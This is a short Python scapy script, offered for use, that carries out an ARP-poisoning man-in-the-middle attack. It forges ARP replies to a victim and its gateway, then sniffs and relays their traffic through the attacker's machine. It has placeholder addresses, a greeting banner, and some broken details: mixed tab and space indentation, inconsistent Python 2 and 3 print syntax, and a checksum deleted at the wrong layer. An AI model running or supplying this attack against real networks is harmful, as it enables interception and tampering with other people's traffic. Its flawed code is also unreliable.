#!/usr/bin/env python
#-*- coding: utf-8 -*-#

import time
from scapy.all import *

#ARP Poison parameters
attack_mac = "[attacker_mac_input]"
gateway_ip = "[gateway_ip_input]"
gateway_mac = "[gateway_mac_input]"
target_ip = "[victim_ip_input]"
target_mac = "[victim_mac_input]"

conf.iface = "ens33"

def arp_poison():
	
	print("[*] Started ARP poison attack [CTRL-C to stop]")
	#victim -> gateway
	send(ARP(op=2, hwsrc=attack_mac, psrc=target_ip, hwdst=gateway_mac, pdst=gateway_ip))		    
	#gateway -> victim
    	send(ARP(op=2, hwsrc=attack_mac, psrc=gateway_ip, hwdst=target_mac, pdst=target_ip))

def callback_a(pkt):
	if ARP in pkt:
		arp_poison()	        
	else:
		if pkt[IP].src == target_ip:
			pkt[Ether].src = attack_mac
			pkt[Ether].dst = gateway_mac
			del pkt.chksum
			sendp(pkt)
			print("packet pass")
      
		#victim -> attacker -> gateway
		
		elif pkt[IP].dst==target_ip:
			pkt[Ether].src = attack_mac
			pkt[Ether].dst = target_mac
			del pkt.chksum
			sendp(pkt)
			print("packet pass")
		#gateway -> attacker -> victim
            		    
print "Welcome to ARP Spoofing world!"

arp_poison()
sniff(filter="host "+target_ip+" or host "+gateway_ip, prn=callback_a)
